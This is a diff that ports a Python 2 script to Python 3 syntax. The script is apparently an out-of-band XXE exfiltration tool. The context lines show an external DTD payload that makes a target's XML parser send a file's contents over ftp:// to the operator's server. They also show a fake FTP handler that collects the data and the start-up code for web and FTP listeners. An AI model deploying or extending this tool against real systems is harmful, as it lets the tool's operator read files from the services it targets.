@@ -16,6 +16,7 @@
 # every log file will get sent. Such is the nature
 # of the beast.
 
+from __future__ import print_function
 import SocketServer
 from threading import Thread
 from time import sleep
@@ -43,7 +44,7 @@ payload = """<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://{}:{}/%file;'>">
 %all;"""
 
 def wlog(_str):
-    print _str
+    print(_str)
     logging.info("{}\n".format(_str))
 
 class WebServer(SocketServer.BaseRequestHandler):
@@ -97,7 +98,7 @@ class FTPServer(SocketServer.BaseRequestHandler):
                 else:
                     wlog("[FTP] > 230 more data please!")
                     self.request.sendall("230 more data please!\n")
-        except Exception, e:
+        except Exception as e:
             if "timed out" in e:
                 wlog("[FTP] Client timed out")
             else:
@@ -112,7 +113,7 @@ def start_server(conn, serv_class):
     
 if __name__ == "__main__":
     if not argv[1]:
-        print "[-] Need public IP of this server in order to receive data."
+        print("[-] Need public IP of this server in order to receive data.")
         exit(1)
     WEB_ARGS = ("0.0.0.0", 8888)
     FTP_ARGS = ("0.0.0.0", 2121)
@@ -124,6 +125,6 @@ if __name__ == "__main__":
     try:
         while True:
             sleep(10000)
-    except KeyboardInterrupt, e:
-        print "\n[+] Server shutting down."
+    except KeyboardInterrupt as e:
+        print("\n[+] Server shutting down.")
 
